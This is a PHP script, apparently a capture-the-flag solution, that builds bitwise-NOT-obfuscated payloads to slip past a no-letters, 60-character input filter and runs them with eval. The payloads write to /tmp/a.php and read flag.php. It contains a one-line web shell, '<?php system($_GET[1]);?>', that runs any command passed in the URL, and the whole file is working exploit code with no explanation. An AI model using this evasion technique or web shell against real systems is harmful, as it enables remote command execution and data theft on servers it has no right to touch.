<?php

$assert=~'file_put_contents';
echo bin2hex($assert). "\n";

$get=~'/tmp/a.php';
echo bin2hex($get) ."\n";

$test=~'<?php system($_GET[1]);?>';
echo bin2hex($test)."\n";

/*$test2='$_%3D~\'%99%96%93%9a%a0%98%9a%8b%a0%9c%90%91%8b%9a%91%8b%8c\'%3B$__%3D~\'%8f%8d%96%91%8b%a0%8d\'%3B$___%3D~\'%a0%b8%ba%ab\'%3B$__($_($___[1]))%3B';
echo urldecode($test2) . "\n" . strlen(urldecode($test2)) . "\n";
echo eval(urldecode($test2));*/

//$write_shell='$_%3D~\'%99%96%93%9a%a0%8f%8a%8b%a0%9c%90%91%8b%9a%91%8b%8c\'%3B$_(~\'%d0%8b%92%8f%d0%9e%d1%8f%97%8f\',~\'%c3%c0%8f%97%8f%df%8c%86%8c%8b%9a%92%d7%db%a0%b8%ba%ab%a4%ce%a2%d6%c4%c0%c1\')%3B';
$write_shell='$_%3D~\'%99%96%93%9a%a0%8f%8a%8b%a0%9c%90%91%8b%9a%91%8b%8c\'%3B$_(~\'%d0%8b%92%8f%d0%9e%d1%8f%97%8f\',~\'%c3%c0%8f%97%8f%df%8c%86%8c%8b%9a%92%d7%db\')%3B';
echo $write_shell . "\n";
echo urldecode($write_shell) . "\n";

if(!preg_match('/[A-Za-z]/is',urldecode($write_shell)) && strlen(urldecode($write_shell)) <= 60) {
    echo "EVAL!\n";
    eval(urldecode($write_shell));
}


$test2='$_%3D~\'%99%96%93%9a%a0%98%9a%8b%a0%9c%90%91%8b%9a%91%8b%8c\'%3B$__%3D~\'%8f%8d%96%91%8b%a0%8d\'%3B$__($_(~\'%99%93%9e%98%d1%8f%97%8f\'))%3B';
echo $test2 . "\n";
echo eval(urldecode($test2));